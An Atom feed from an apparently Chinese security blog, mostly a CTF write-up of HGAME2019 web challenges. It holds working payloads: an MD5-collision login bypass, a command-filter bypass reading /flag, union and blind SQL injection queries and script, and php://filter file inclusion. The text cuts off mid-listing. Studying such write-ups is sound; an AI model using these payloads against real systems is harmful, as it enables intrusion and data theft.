<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Charles&#39; Blog</title>
  
  <subtitle>前方如聂鲁达的爱情诗一般美好</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chaosec.top/"/>
  <updated>2019-03-08T14:58:33.093Z</updated>
  <id>http://chaosec.top/</id>
  
  <author>
    <name>新城瑞雪</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Unknown Article</title>
    <link href="http://chaosec.top/2019/03/08/kaoyan/"/>
    <id>http://chaosec.top/2019/03/08/kaoyan/</id>
    <published>2019-03-08T14:58:33.000Z</published>
    <updated>2019-03-08T14:58:33.093Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="君心我心" />    <label for="pass">君心我心</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chaosec.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Essay" scheme="http://chaosec.top/tags/Essay/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2019-Web-Week3&amp;4</title>
    <link href="http://chaosec.top/2019/03/02/hgame2019b/"/>
    <id>http://chaosec.top/2019/03/02/hgame2019b/</id>
    <published>2019-03-02T07:55:12.000Z</published>
    <updated>2019-03-02T08:06:19.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week-3"><a href="#week-3" class="headerlink" title="week-3"></a>week-3</h1><a id="more"></a><h2 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h2><p>文件探测一下发现存在备份文件泄露<code>.login.php.swp</code>，核心代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'username'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'password'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'code'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    $code     = (string)$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your input can't be the same"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Good"</span>; </span><br><span class="line">    </span><br><span class="line">        header(<span class="string">'Location: admin.php'</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt; Invalid password&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章<a href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">link</a>，有一个工具fastcoll就可以生成两个MD5值相同的不同文件</p><ol><li><p>先生成两个MD5值相同的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o test0 test1</span><br></pre></td></tr></table></figure></li><li><p>然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test1 -o test00 test01</span><br></pre></td></tr></table></figure></li><li><p>将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -c 128 test00 &gt; a</span><br><span class="line">tail -c 128 test01 &gt; b</span><br></pre></td></tr></table></figure></li><li><p>执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type test0 a &gt; test10</span><br><span class="line">type test1 b &gt; test11</span><br></pre></td></tr></table></figure></li></ol><p>于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode username@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test00 --data-urlencode password@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test01 --data-urlencode code@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test10 http://118.25.89.91:8080/question/login.php -i</span><br></pre></td></tr></table></figure><p>之后可以得到服务器返回的cookie<code>Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/</code>，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br></pre></td></tr></table></figure></p><p>绕过很简单，通配符与单引号都可以绕过</p><p>payload：<code>cat /fl??</code> OR <code>cat /fl&#39;&#39;ag</code></p><p>flag：<code>hgame{a1c83b66cc504d583c09ea6c20c0dabc}</code></p><h2 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5($_GET[<span class="string">"code"</span>]),<span class="number">0</span>,<span class="number">4</span>) === <span class="number">7229</span></span><br></pre></td></tr></table></figure><p>题目需要验证码，可以爆破一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999999</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(substr(md5($i), <span class="number">0</span>, <span class="number">4</span>)===<span class="string">'803a'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是常规的数字型注入了，注意每次都要更新一下code值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=4446&amp;id=1 order by 1--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=31226&amp;id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><blockquote><p>f1l1l1l1g,words </p></blockquote><p>不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=70176&amp;id=-1 union select group_concat(column_name) from information_schema.columns where table_name=0x66316c316c316c3167--+</span><br></pre></td></tr></table></figure><blockquote><p>f14444444g</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=51097&amp;id=-1 union select f14444444g from f1l1l1l1g--+</span><br></pre></td></tr></table></figure><p>flag: <code>hgame{sql1_1s_iNterest1ng}</code></p><h2 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h2><p>依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。</p><p>PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'lseqgohjo9eibfivnemk6sa8vd'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(_in)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(_in.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    res = requests.get(url, cookies=cookies).text</span><br><span class="line">    code = re.findall(<span class="string">r'=== (.&#123;4&#125;)&lt;br&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> code == md5(str(i)):</span><br><span class="line">            <span class="keyword">return</span> str(i)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.111.179:3001/"</span></span><br><span class="line">output = <span class="string">"hgame&#123;sqli_1s_s0_"</span></span><br><span class="line">succ = <span class="string">"sql error"</span></span><br><span class="line">name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">'_&#123;&#125;'</span>  + <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> name_dic:</span><br><span class="line">        code = get_code()</span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># F11111114G,WORDS</span></span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name="F11111114G"),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># FL4444AG</span></span><br><span class="line">        payload = <span class="string">f'?code=<span class="subst">&#123;code&#125;</span>&amp;id=1 and if((substr((select FL4444AG from F11111114G),<span class="subst">&#123;str(i)&#125;</span>,1)=binary "<span class="subst">&#123;str(j)&#125;</span>"),sleep(-5),1)--+'</span></span><br><span class="line">        res = requests.get(url+payload,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> succ <span class="keyword">in</span> res:</span><br><span class="line">            output += j</span><br><span class="line">            print(<span class="string">"output: "</span>,output)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure><h2 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h2><p>正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有<code>action=message</code>，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/header.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (is_null($_SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location:/login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$page = array_key_exists(<span class="string">'action'</span>, $_GET) ? $_GET[<span class="string">'action'</span>] : <span class="string">'message'</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/footer.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>functions.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set("display_errors", "on");</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_token</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $token = <span class="string">''</span>;</span><br><span class="line">    $chars = str_split(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">48</span>; $i++) &#123;</span><br><span class="line">        $token = $token . $chars[random_int(<span class="number">0</span>, <span 